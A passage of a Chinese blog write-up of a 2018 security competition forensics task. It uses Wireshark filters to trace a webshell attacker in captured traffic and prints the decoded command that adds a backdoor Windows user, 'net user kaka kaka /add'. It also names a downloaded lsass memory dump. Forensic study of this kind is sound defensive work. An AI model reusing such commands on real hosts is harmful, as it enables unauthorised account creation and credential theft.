+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.1.8 &amp;&amp; http &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到第一次连接的ip为<code>4.2.2.2</code></p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424220929490.png"></p>
+<h1 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h1><p><strong>题目要求：<br>1.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候<br>2.黑客在内网主机中添加的用户名和密码是多少<br>3.黑客从内网服务器中下载下来的文件名</strong></p>
+<p>找下出现列出文件列表的请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;system&quot; &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>可以发现有ls和dir，后经验证是dir</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424234829936.png"></p>
+<p>我们看下响应包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>翻了一会找到<code>NET USER</code>命令</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235537584.png"></p>
+<p>继续往下翻找到添加用户为kaka</p>
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240424235818984.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">18:49:27.767754时，不存在kaka用户</span><br><span class="line">18:50:42.908737时，kaka用户已成为管理员</span><br></pre></td></tr></table></figure>
+
+<p>所以可以断定作案时间点在这段时间内，找到后解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B/image-20240425000833804.png"></p>
+<p>既然是下载，应该是利用中国菜刀进行下载了，那我们只过滤出post流量，查看命令即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst == 192.168.2.20 &amp;&amp; http.request.method==POST</span><br></pre></td></tr></table></figure>
+
+<p>查看最后一个解码得到<code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/" rel="tag"># 铁人三项</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/Logjammer-HackTheBox.html" rel="prev" title="Logjammer">
+      <i class="fa fa-chevron-left"></i> Logjammer
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html" rel="next" title="记录kali如何挂梯子">
+      记录kali如何挂梯子 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%80"><span class="nav-number">1.</span> <span class="nav-text">题目一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%8C"><span class="nav-number">2.</span> <span class="nav-text">题目二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%89"><span class="nav-number">3.</span> <span class="nav-text">题目三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9B"><span class="nav-number">4.</span> <span class="nav-text">题目四</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
